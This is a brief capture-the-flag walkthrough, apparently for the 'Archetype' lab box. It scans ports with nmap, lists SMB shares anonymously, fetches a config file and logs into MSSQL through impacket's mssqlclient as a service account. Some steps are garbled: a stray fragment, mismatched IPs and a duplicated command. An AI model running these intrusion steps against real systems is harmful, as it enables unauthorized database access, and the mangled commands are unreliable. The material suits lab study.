### 1. Scan the open ports
nmap -sC -sV 10.129.18.200

### 2. Use SMB open service
smbclient -N -L \\\\10.129.18.200\\
 
get prod.dtsConfig

### 3. Install impacket
 t
cd impacket
sudo python3 setup.py  install
# In case you are missing some modules:
pip3 install -r requirements.txt
python3 -m pip install --upgrade pip

### 4. Use impacket examples to navigate through the database
cd examples/
python3 mssqlclient.py -h
sudo python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.14.113 -windows-auth
SELECT is_srvrolemember('sysadmin');sudo python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.14.113 -windows-auth 
After our successful connection it is advisable to further check the help option of our SQL shell: 
<img width="776" height="248" alt="image" src="https://github.com/user-attachments/assets/ed386153-b514-448c-a6fe-8fa468608fdc" />
